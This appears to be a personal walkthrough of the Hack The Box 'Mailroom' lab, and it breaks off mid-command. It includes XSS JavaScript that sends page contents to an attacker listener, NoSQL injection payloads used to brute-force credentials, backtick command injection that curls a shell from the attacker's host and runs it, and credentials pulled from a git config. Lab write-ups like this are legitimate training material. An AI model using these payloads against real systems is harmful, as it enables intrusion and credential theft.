*## RUSTSCAN:

```Bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBsIk5aL2paRLxMWRinGX8YNkoR0QoWuLBzpzq+IZIwWJ8H/ZW2sybQ7xCOaoe37vmNMwFWoZ/2z68JP5eG2n0ucrGkiNXY0ZHzXWvU7BYF2BKxCtCuGLV8vVR/voIkIRPRxgMkxQ8UU0k3sGNkB0sOlsDKWJFIpgruIT3wApfaXp6WYfBHuLee7mHWcLWZfsjnBbYnc2jWRm4z9YTK3USwnsX4f8ki7eC3DYq8RB5Kx7U6u/5aiC0Z50gbuTR5YJPPFt7rawTrPPwT31sS3/Q4kCDfhFWOrcV1wIy2xrEAUG+RtbS84D2RotizXIEphaqueK6Tl8LNZvB2VbL72xqMfSqplCXS3rO9fs2Ie/Q47m9BVNNjwShnwAnGa8kJLXJb+x/qBE2aagzn599dVre9khFU8LWiptr6lw9ksEfPw8f1+XEBXjc2ECWkdap9KOx7QRTIEVzVJ8MRHn/Bp/EQ9Uz+whe6K5U6Egle7JHtd8qUPPUitVX+QyFqBwdH50=
|   256 821beb758b9630cf946e7957d9ddeca7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZd951iwnVNWvSYmYx8ZJUf9o5yhI3zVuVAfNLLrTdhwnstMMOWcnMDyPgwfnbzDJ89BnmvHuC5k9kVJjIQJpM=
|   256 19fb45feb9e4275de5bbf35497dd68cf (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIImOwXljVycTwdL6fg/kkMWPDWdO+roydyEf8CeBYu7X
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-favicon: Unknown favicon MD5: 846CD0D87EB3766F77831902466D753F
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: The Mail Room
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
```

* * *

## SSH:

So far no known exploit are available on that particular version of OpenSSH server since it's pretty new and I don't think bruteforcing is the intended way so I will move along and come back we I find some credentials to login.

* * *

## HTTP Footprinting:

Loggin into website manually we are presented with a pretty normal web interface:

![fddad4cb04a4b09789218456619b71b8.png](../../../_resources/fddad4cb04a4b09789218456619b71b8.png)

From a first analisys seems like no traces are left back into html code from possible code snippets or notes into comment fields.

Running a Subdomain fuzzing with FFUF gave us one new subdomain:

```Bash
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://mailroom.htb/ -H "Host:FUZZ.mailroom.htb" -fl 129

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://mailroom.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.mailroom.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response lines: 129
________________________________________________

[Status: 200, Size: 13201, Words: 1009, Lines: 268, Duration: 42ms]
    * FUZZ: git

:: Progress: [19966/19966] :: Job [1/1] :: 1129 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
```

Doing same thing but but this time on Wedirectories will unveil possible hidden web folders in the URL path, I like to use Dirsearch tool for that. But nothing special came out more that what we can see with our eyes from a manual playing around on a browser session:

```Bash
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# dirsearch -u 'http://mailroom.htb'

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/aleksandar/Downloads/reports/http_mailroom.htb/_23-04-17_10-53-54.txt

Target: http://mailroom.htb/

[10:53:54] Starting:
[10:53:54] 301 -  309B  - /js  ->  http://mailroom.htb/js/
[10:53:55] 403 -  277B  - /.ht_wsr.txt
[10:53:55] 403 -  277B  - /.htaccess.save
[10:53:55] 403 -  277B  - /.htaccess.orig
[10:53:55] 403 -  277B  - /.htaccess.bak1
[10:53:55] 403 -  277B  - /.htaccess.sample
[10:53:55] 403 -  277B  - /.htaccess_extra
[10:53:55] 403 -  277B  - /.htaccess_orig
[10:53:55] 403 -  277B  - /.htaccess_sc
[10:53:55] 403 -  277B  - /.htaccessBAK
[10:53:55] 403 -  277B  - /.htaccessOLD2
[10:53:55] 403 -  277B  - /.htm
[10:53:55] 403 -  277B  - /.html
[10:53:55] 403 -  277B  - /.htaccessOLD
[10:53:55] 403 -  277B  - /.htpasswds
[10:53:55] 403 -  277B  - /.htpasswd_test
[10:53:55] 403 -  277B  - /.httr-oauth
[10:53:58] 200 -    1KB - /about.php
[10:54:05] 301 -  313B  - /assets  ->  http://mailroom.htb/assets/
[10:54:05] 403 -  277B  - /assets/
[10:54:09] 200 -    1KB - /contact.php
[10:54:09] 301 -  310B  - /css  ->  http://mailroom.htb/css/
[10:54:19] 301 -  317B  - /javascript  ->  http://mailroom.htb/javascript/
[10:54:19] 403 -  277B  - /js/
[10:54:34] 200 -    0B  - /README.md
[10:54:36] 403 -  277B  - /server-status
[10:54:36] 403 -  277B  - /server-status/
[10:54:40] 403 -  277B  - /template
[10:54:40] 403 -  277B  - /template/

Task Completed
```

We can see a list on possible users that we may want to test for future?

![1f7344d26ddf4531acd201b7428d922f.png](../../../_resources/1f7344d26ddf4531acd201b7428d922f.png)

* * *

## GIT Enumeration:

So far the main website seems uninteresting so far so I will try to move forward to GIT subdomain we found at the beginning and try to see that can I find more interesting there.

![b4925c592e2ebe24881d22442fbc2df7.png](../../../_resources/b4925c592e2ebe24881d22442fbc2df7.png)

Good we have an Gitea installed instance on the machine, with version:

![ebd6f7e11e528521a4e1dc372d8364ee.png](../../../_resources/ebd6f7e11e528521a4e1dc372d8364ee.png)

So far no know exploit are out in the wild for this particular version, and we have no account to login. Playing around we can see a public repository that do not need a login to be checked:

![ae0628defab0680a4f1cd02968fda4d0.png](../../../_resources/ae0628defab0680a4f1cd02968fda4d0.png)

The repository seems about the main website code and we can also see the users on the platform:

![77f4d42f61e8fba00c167864c38a06db.png](../../../_resources/77f4d42f61e8fba00c167864c38a06db.png)

Checking thru the repository the first file that catched my attentions was auth.php where I could see how 2FA is handled:

```Php
// Update the user record in the database with the 2FA token if not already sent in the last minute
    $user = $collection->findOne(['_id' => $user['_id']]);
    if(($user['2fa_token'] && ($now - $user['token_creation']) > 60) || !$user['2fa_token']) {
        $collection->updateOne(
          ['_id' => $user['_id']],
          ['$set' => ['2fa_token' => $token, 'token_creation' => $now]]
        );

        // Send an email to the user with the 2FA token
        $to = $user['email'];
        $subject = '2FA Token';
        $message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token;
        mail($to, $subject, $message);
```

But what is more important now is that subdomain for Staff users that we haven't found before with FFUF fuzzing tool, so let's add it to our hosts file and move forward with enumeration.

* * *

## Staff-Review Enumeration:

So far seems like the website can't show up?

![8ea23fcf2f415a5e41b855af12c88478.png](../../../_resources/8ea23fcf2f415a5e41b855af12c88478.png)

After several try and catch came up on this document on how to bypass the 403 page: https://sechunter.medium.com/exploiting-admin-panel-like-a-boss-fc2dd2499d31

Basically the trick is to change the Host: with a random value (see Host: test.com)

![773a43385dc75a3043ce3e7db8e4f686.png](../../../_resources/773a43385dc75a3043ce3e7db8e4f686.png)

That helped us to bypass the website and see the thing:

![d2f4c19e66bf96682d93875ca317dd2b.png](../../../_resources/d2f4c19e66bf96682d93875ca317dd2b.png)

Ok so here I did some steps back and went back on main website and tried to play around with the Contact form and send some dummy data. People on HTB forum tipsed about XSS so I tried to inglobe some XSS payload and website generates an inquiry:

![ea2b34be47a03988418f61876a12e471.png](../../../_resources/ea2b34be47a03988418f61876a12e471.png)

And checking then generate inquiry:

![4a4a5a833ad25c1e42429d06dff121ac.png](../../../_resources/4a4a5a833ad25c1e42429d06dff121ac.png)

Good seems like XSS in working baby. Now we need to know what to do here. So I guess we have to use this XSS to speak to the site on the back.

https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#steal-page-content

This link can leads us to do what we want... But we have to host that payload.js and we can use this guide so we can get what we really want of it: https://www.trustedsec.com/blog/simple-data-exfiltration-through-xss/

So I did some improvements, by following what the instruction were saying i did following:

1.  Setup a Simple Http server with Python3 on my IP address

![d8721fd20240c4e54ea263bb3eb7b872.png](../../../_resources/d8721fd20240c4e54ea263bb3eb7b872.png)

1.  Wrote a payload.js in the same folder serving the HTTP server from step 1 and adapted the code from(https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#steal-page-content)

```JS
var url = "http://staff-review-panel.mailroom.htb/index.php";
var attacker = "http://10.10.14.8:4444/";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);
```

Basically here the URL is the page we want to render, and attacker is the link to our nc listening for request

1.  Then I setup a NC in listening mode on that port

![5afc72d7be6dd0733d82a0b7df79ce48.png](../../../_resources/5afc72d7be6dd0733d82a0b7df79ce48.png)

1.  Lastly we send a XSS payload on in the Comment field poiting to the http url hosting out exfiltration JS

![f07c01cad91da64845850d8d84bbb398.png](../../../_resources/f07c01cad91da64845850d8d84bbb398.png)

And KABOOM is working!

![bb41b7ea345b5dc1b1f9bd74f04b87b5.png](../../../_resources/bb41b7ea345b5dc1b1f9bd74f04b87b5.png)

But the response seems B64 encoded and even if I decode it is still jibberish so I will try to change the JS a bit to get a better response. So the funtion "btoa" it base64 encode and URI part it encode in URL. checking on Mozzillas guidelines about JS i tried the status function:

```JS
var url = "http://staff-review-panel.mailroom.htb/index.php";
var attacker = "http://10.10.14.8:4444/";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + xhr.status)
    }
}
xhr.open('GET', url, true);
xhr.send(null);
```

And this show me the Headers in cleartext good!

![0f81ed2a157cba7d7b3896540d71eb5b.png](../../../_resources/0f81ed2a157cba7d7b3896540d71eb5b.png)

Now we have to parse correctly the Body in response. Againg after several try and catch I succeded to get a good export by using response instead of responsetext and this is the resut:

```Bash
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/temp]
└─# nc -vlnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.209] 50210
GET /?%0A%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang=%22en%22%3E%0A%0A%3Chead%3E%0A%20%20%3Cmeta%20charset=%22utf-8%22%20/%3E%0A%20%20%3Cmeta%20name=%22viewport%22%20content=%22width=device-width,%20initial-scale=1,%20shrink-to-fit=no%22%20/%3E%0A%20%20%3Cmeta%20name=%22description%22%20content=%22%22%20/%3E%0A%20%20%3Cmeta%20name=%22author%22%20content=%22%22%20/%3E%0A%20%20%3Ctitle%3EInquiry%20Review%20Panel%3C/title%3E%0A%20%20%3C!--%20Favicon--%3E%0A%20%20%3Clink%20rel=%22icon%22%20type=%22image/x-icon%22%20href=%22assets/favicon.ico%22%20/%3E%0A%20%20%3C!--%20Bootstrap%20icons--%3E%0A%20%20%3Clink%20href=%22font/bootstrap-icons.css%22%20rel=%22stylesheet%22%20/%3E%0A%20%20%3C!--%20Core%20theme%20CSS%20(includes%20Bootstrap)--%3E%0A%20%20%3Clink%20href=%22css/styles.css%22%20rel=%22stylesheet%22%20/%3E%0A%3C/head%3E%0A%0A%3Cbody%3E%0A%20%20%3Cdiv%20class=%22wrapper%20fadeInDown%22%3E%0A%20%20%20%20%3Cdiv%20id=%22formContent%22%3E%0A%0A%20%20%20%20%20%20%3C!--%20Login%20Form%20--%3E%0A%20%20%20%20%20%20%3Cform%20id=%27login-form%27%20method=%22POST%22%3E%0A%20%20%20%20%20%20%20%20%3Ch2%3EPanel%20Login%3C/h2%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20required%20type=%22text%22%20id=%22email%22%20class=%22fadeIn%20second%22%20name=%22email%22%20placeholder=%22Email%22%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20required%20type=%22password%22%20id=%22password%22%20class=%22fadeIn%20third%22%20name=%22password%22%20placeholder=%22Password%22%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20type=%22submit%22%20class=%22fadeIn%20fourth%22%20value=%22Log%20In%22%3E%0A%20%20%20%20%20%20%20%20%3Cp%20hidden%20id=%22message%22%20style=%22color:%20 HTTP/1.1
Host: 10.10.14.8:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/
Origin: http://127.0.0.1
Connection: keep-alive
```

```JS
var url = "http://staff-review-panel.mailroom.htb/index.php";
var attacker = "http://10.10.14.8:4444/";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(xhr.response))
    }
}
xhr.open('GET', url, true);
xhr.send(null);
```

And URL encoding the text we have the source code of the index.php:

```HTML
<!DOCTYPE html><html lang="en"><head>  <meta charset="utf-8" />  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />  <meta name="description" content="" />  <meta name="author" content="" />  <title>Inquiry Review Panel</title>  <!-- Favicon-->  <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />  <!-- Bootstrap icons-->  <link href="font/bootstrap-icons.css" rel="stylesheet" />  <!-- Core theme CSS (includes Bootstrap)-->  <link href="css/styles.css" rel="stylesheet" /></head><body>  <div class="wrapper fadeInDown">    <div id="formContent">      <!-- Login Form -->      <form id='login-form' method="POST">        <h2>Panel Login</h2>        <input required type="text" id="email" class="fadeIn second" name="email" placeholder="Email">        <input required type="password" id="password" class="fadeIn third" name="password" placeholder="Password">        <input type="submit" class="fadeIn fourth" value="Log In">        <p hidden id="message" style="color:
```

Trying to ask for auth.php in post mode we can get a resut:

![9f2b308d3cd21c1a2430a6a442da790d.png](../../../_resources/9f2b308d3cd21c1a2430a6a442da790d.png)

And url decoding it:

`{"success":false,"message":"Email and password are required"}`

But this script I don't like it so instead I will edit and take idea from other people and use same function xml in the exfiltration to out nc. Using this code:

```JS
var url = "http://staff-review-panel.mailroom.htb/auth.php";
var attacker = "http://10.10.14.8:4444/";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(xhr.response))
    }
}
xhr.open('POST', url, true);
xhr.send(null);
```

And now I like it much more!
![299b747e2b3c60e816aaf2aa0584e901.png](../../../_resources/299b747e2b3c60e816aaf2aa0584e901.png)

And now we now that values need to be shipped. Now checking the code on the Gitea page we know that application form/www type need to be shipped during login status so we can do it:

![a478b28b71651d08caf2d6c6cf10c7aa.png](../../../_resources/a478b28b71651d08caf2d6c6cf10c7aa.png)

And adding this into last part of the code:

```JS
xhr.open('POST', url, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
xhr.send("email=yovecio&password=cacca");
```

Now we see that application is parsing the values shipped!

```Text
Status:
401
 Body:
{"success":false,"message":"Invalid email or password"}
```

Good now here i had to ask to for some tips on HTB forum and apparently the way to go is SQLi.

Checkinng from Gitea repository we could see that the auth.php have some mongodb connection before the login steps so we can assure that this is a NoSQLi injection type since MongoDB is a non-relational database type aka NoSQL.

![a940d69a8e5198221f7b646f8f5eb019.png](../../../_resources/a940d69a8e5198221f7b646f8f5eb019.png)

We can see some payloads on our beloved BookHacktricks: https://book.hacktricks.xyz/pentesting-web/nosql-injection

So trying some Auth bypass commads shipped in the body, what if we try to use this one?

```Text
email[$ne]=toto&password[$ne]=toto
```

Ok no answer back:

![2e194fa4fba819204c8d10a1ba6db296.png](../../../_resources/2e194fa4fba819204c8d10a1ba6db296.png)

But what about another?

```Text
email[$regex]=.*&password[$regex]=.*
```

And yes we have an answer:

![b8aef274473bf7bc0c19270761988669.png](../../../_resources/b8aef274473bf7bc0c19270761988669.png)

Good now that we know we can bypass NoSQL with this injection we can move forward and maybe try to bruteforce our way in!

Now here for now I used this solutions as another user did: https://github.com/dryu8/hackthebox/blob/main/Mailroom/userpwned.js

Later I will try to use functions so I can call those functions for a better reusability!

Running the script we find "an":

```Text
10.10.11.209 - - [21/Apr/2023 14:37:53] "GET /test.js HTTP/1.1" 200 -
10.10.11.209 - - [21/Apr/2023 14:37:53] code 404, message File not found
10.10.11.209 - - [21/Apr/2023 14:37:53] "GET /n HTTP/1.1" 404 -
10.10.11.209 - - [21/Apr/2023 14:37:54] code 404, message File not found
10.10.11.209 - - [21/Apr/2023 14:37:54] "GET /an HTTP/1.1" 404 -
```

Adding "an" as rule and running again the script we can find more:

```Text
10.10.11.209 - - [21/Apr/2023 14:39:15] "GET /test.js HTTP/1.1" 200 -
10.10.11.209 - - [21/Apr/2023 14:39:16] code 404, message File not found
10.10.11.209 - - [21/Apr/2023 14:39:16] "GET /tan HTTP/1.1" 404 -
10.10.11.209 - - [21/Apr/2023 14:39:17] code 404, message File not found
10.10.11.209 - - [21/Apr/2023 14:39:17] "GET /stan HTTP/1.1" 404 -
```

And more:

```Text
10.10.11.209 - - [21/Apr/2023 14:41:08] "GET /test.js HTTP/1.1" 200 -
10.10.11.209 - - [21/Apr/2023 14:41:09] code 404, message File not found
10.10.11.209 - - [21/Apr/2023 14:41:09] "GET /istan HTTP/1.1" 404 -
```

Nice we found the email(tristan@mailroom.htb):

```Text
10.10.11.209 - - [21/Apr/2023 14:42:03] "GET /test.js HTTP/1.1" 200 -
10.10.11.209 - - [21/Apr/2023 14:42:04] code 404, message File not found
10.10.11.209 - - [21/Apr/2023 14:42:04] "GET /ristan HTTP/1.1" 404 -
10.10.11.209 - - [21/Apr/2023 14:42:05] code 404, message File not found
10.10.11.209 - - [21/Apr/2023 14:42:05] "GET /tristan HTTP/1.1" 404 -
```

Now it's time for password, I will reause the previous code but edit a bit the payload in the body so I will use tristans email and doing so we can bruteforce the password:

```Text
"email=tristan@mailroom.htb&password[$regex]=^"+pass
```

This regex can be found on NoSQLi page in Book hacktricks:

`username[$regex]=^adm$password[$ne]=1  #Check a <regular expression>, could be used to brute-force a parameter`

From here on I will do all in one tread:

```Text
10.10.11.209 - - [21/Apr/2023 14:48:37] "GET /test.js HTTP/1.1" 200 -
10.10.11.209 - - [21/Apr/2023 14:48:38] code 404, message File not found
10.10.11.209 - - [21/Apr/2023 14:48:38] "GET /6 HTTP/1.1" 404 -
10.10.11.209 - - [21/Apr/2023 15:00:44] "GET /69 HTTP/1.1" 404 -
10.10.11.209 - - [21/Apr/2023 15:03:14] "GET /69tr HTTP/1.1" 404 -
10.10.11.209 - - [21/Apr/2023 15:04:06] "GET /69tri HTTP/1.1" 404 -
10.10.11.209 - - [21/Apr/2023 15:05:55] "GET /69trisR HTTP/1.1" 404 -
10.10.11.209 - - [21/Apr/2023 15:06:33] "GET /69trisRu HTTP/1.1" 404 -
10.10.11.209 - - [21/Apr/2023 15:07:20] "GET /69trisRule HTTP/1.1" 404 -
10.10.11.209 - - [21/Apr/2023 15:08:09] "GET /69trisRulez HTTP/1.1" 404 -
10.10.11.209 - - [21/Apr/2023 15:08:57] "GET /69trisRulez! HTTP/1.1" 404 -
```

And that was it, we have a password now!

* * *

## Road to User.txt

Now with these credentials we can try to login into SSH and see if we can grab our first flag:

![6b065854c502233765dab06441142320.png](../../../_resources/6b065854c502233765dab06441142320.png)

Now that we are in we can grab our first flag:

![0017174fb9754f7066bfc54db4a44c2c.png](../../../_resources/0017174fb9754f7066bfc54db4a44c2c.png)

But user.txt is in matthew's home so we need to PE to him. He can't run any sudo commands:

![c54a8cfa4fbd69d0cb9a1f28fe976863.png](../../../_resources/c54a8cfa4fbd69d0cb9a1f28fe976863.png)

I will upload a Linpeas copy and run thru a whole system enumeration...

Open ports:

```Text
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:35823         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 172.19.0.1:25           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Some Keypass DB  but can't be decrypted:

```Text
╔══════════╣ Analyzing Keepass Files (limit 70)
-rw-r--r-- 1 matthew matthew 1998 Mar 16 22:47 /home/matthew/personal.kdbx
```

And some traces about Postfix Mailserver that maybe can be exploited to root?

```Text
drwxr-xr-x 5 root root 4096 Jan 17 19:54 /etc/postfix
-rw-r--r-- 1 root root 6208 Jan 15 16:14 /etc/postfix/master.cf
  flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}
#  user=cyrus argv=/cyrus/bin/deliver -e -r ${sender} -m ${extension} ${user}
#  flags=R user=cyrus argv=/cyrus/bin/deliver -e -m ${extension} ${user}
  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
  flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient
  flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}
  flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py
  
  ╔══════════╣ Mails (limit 50)
    30943      4 -rw-------   1 root     mail          610 Apr 21 13:16 /var/mail/root
    29709      4 -rw-------   1 tristan  mail          416 Apr 21 13:15 /var/mail/tristan
    30943      4 -rw-------   1 root     mail          610 Apr 21 13:16 /var/spool/mail/root
    29709      4 -rw-------   1 tristan  mail          416 Apr 21 13:15 /var/spool/mail/tristan
```

Here didn't knowing what to do I checked back on tips on forum and apparently we have to dig deeper into this staff website...

We know it was not open from the outsite but is sure open from the inside:

![f3da023b425a0db9c56a0955190a76a0.png](../../../_resources/f3da023b425a0db9c56a0955190a76a0.png)

can we curl it? Yes:

![636f60119a09a7b41912825e5dd3c8db.png](../../../_resources/636f60119a09a7b41912825e5dd3c8db.png)

We have to use a tunneling tool to redirect it to our machine so we can access it!

I will try to use ssh local forwarding:

```Bash
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/temp]
└─# ssh -L 8100:staff-review-panel.mailroom.htb:80 tristan@mailroom.htb
tristan@mailroom.htb's password:
```

And opening the page we can see the login:

![d9487ee813d0851b1518210277850e19.png](../../../_resources/d9487ee813d0851b1518210277850e19.png)

Trying to login with Tristan credentials we get the message that we have to cvheck for incoming emails for 2fa:

![becceeb360c9457af316337b3ed811c5.png](../../../_resources/becceeb360c9457af316337b3ed811c5.png)

Checking back in ssh under /var/mail/ we can read the email send to tristan:

```Bash
tristan@mailroom:/var/mail$ cat tristan
Return-Path: <noreply@mailroom.htb>
X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
        by mailroom.localdomain (Postfix) with SMTP id 3E657DB4
        for <tristan@mailroom.htb>; Fri, 21 Apr 2023 13:08:54 +0000 (UTC)
Subject: 2FA

Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=2c66d5cea4be0b598bdd11f42404518e
From noreply@mailroom.htb  Fri Apr 21 14:03:38 2023
Return-Path: <noreply@mailroom.htb>
X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
        by mailroom.localdomain (Postfix) with SMTP id 76CBDD9E
        for <tristan@mailroom.htb>; Fri, 21 Apr 2023 14:03:38 +0000 (UTC)
Subject: 2FA

Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=2b2814d1deee50e06f22ab881b34b8a3
```

Using the last mfa we are in baby:

![7f3e71b2214f29b92843e9e6e72b6306.png](../../../_resources/7f3e71b2214f29b92843e9e6e72b6306.png)

I guess now as we are logged as Tristan we have to inject some RCE to get it as tristan... Now trying to play a bit in the website and executing some test queries in the only function available in the website(Inspect):

![e3fcb71d37ed6bed52f0e7be2a6e97ff.png](../../../_resources/e3fcb71d37ed6bed52f0e7be2a6e97ff.png)

We can see that Inspect.php is the function called during inquiry check so I will go back to Gitea and check the code to see how can I bypass the controls and see if I can get a RCE!

In both cases seems like a initial sanitations on special chars is done via php and then passed to shell_exec function:

```PHP
(isset($_POST['status_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['status_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
```

Trying sending a normal payload we error error on parsing:

![df6b8d325b29a0fc8ed6be82d3534520.png](../../../_resources/df6b8d325b29a0fc8ed6be82d3534520.png)

Then comparing what is removed from sanitifications and some command injection payloads for Linux this should do it work:

![edcbbee6cdd3ad619ad359d3d8f75a00.png](../../../_resources/edcbbee6cdd3ad619ad359d3d8f75a00.png)

So running this command should upload a shell:

```Bash
`curl http://10.10.14.5:9000/shell -o /tmp/shell`
```

And indeed is working:

![f3664c8e40b14402ff59a0c6763dba53.png](../../../_resources/f3664c8e40b14402ff59a0c6763dba53.png)

And then shipping a same command but this time to open the shell:

```Bash
`bash /tmp/shell`
```

This spawn us a RCE in NC as www-data:

![bad9a5004779a2112640a077ce10b358.png](../../../_resources/bad9a5004779a2112640a077ce10b358.png)

Ok here we are into a docker/container environment since it have another hostaname and we have nothing into home folder.. 

Here checking into var/www we could see some .git folder:

![c3dffac4a385fb04a1cda0a03b679d07.png](../../../_resources/c3dffac4a385fb04a1cda0a03b679d07.png)

Drilling down we could see a config file that eventually will have matthew credentials hardcoded:

```Bash
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
[user]
        email = matthew@mailroom.htb
www-data@f609b7be1af1:/var/www/staffroom/.git$
```

Where that %23 need to be decoded from URL:

![ff6239a0676807d4c63e9a4a72802d9e.png](../../../_resources/ff6239a0676807d4c63e9a4a72802d9e.png)

And nice we can grab first flag:

![d8ddcdc24ffb7800b960e1e63676bf60.png](../../../_resources/d8ddcdc24ffb7800b960e1e63676bf60.png)

* * *

## Road to Root.txt

Now here i guess we really need to find how to open that Keypass DB and I don't think we need to crack it since many people flagged that is not matter of cracking but to use pspy and strace to check linux "secrets"...

So uploading pspy and letting it run as matthew:

![6219fc2548d83fa898c8e9fbea667263.png](../../../_resources/6219fc2548d83fa898c8e9fbea667263.png)

I only see this kpcli recurrent.. Checkin it we can see is a commandline cli for Keepas: https://kpcli.sourceforge.io/

So running strace on that kpcli and I've seen a lot of jibberish data and calls to the system but then scrolling thru the calls:

![dade4c62352004f60fb04404057f40aa.png](../../../_resources/dade4c62352004f60fb04404057f40aa.png)

This seems like the entry point in the cli. But I need to find a way on  how to filter out only some strings in the output so I stumbled upon this: https://medium.com/@adminstoolbox/debugging-using-strace-efda7d65be1d

After several try and catch seems like the best solutions to filter out strace logs is by redirecting ouput to a file and afterward use traditions grep. And the command will be something like this: `ps auxw | grep kpcli | awk '{print " -p " $2}' | xargs strace -o /tmp/trace.txt` 

Now we start by listing all procesess: ps aux

The we filter kpcli with grep:

```Bash
matthew@mailroom:~$ ps aux | grep kpcli
matthew   301554  2.5  0.5  27720 22696 ?        Ss   16:54   0:00 /usr/bin/perl /usr/bin/kpcli
matthew   301565  0.0  0.0   6432   720 pts/0    S+   16:54   0:00 grep --color=auto kpcli
```

Doing so we see 2 processes and we are interesed only in the perl one so we can contatenate grep by grepping even perl string:

```Bash
matthew@mailroom:~$ ps aux | grep kpcli | grep perl
matthew   301679  1.3  0.6  29436 24444 ?        Ss   16:55   0:00 /usr/bin/perl /usr/bin/kpcli
```

Now we use akw to export the PID:

```Bash
matthew@mailroom:~$ ps aux | grep kpcli | grep perl | awk '{print $2}'
302158
```

Ant lastly we can call the strace with -p (export from the steps before blahhh):

```Bash
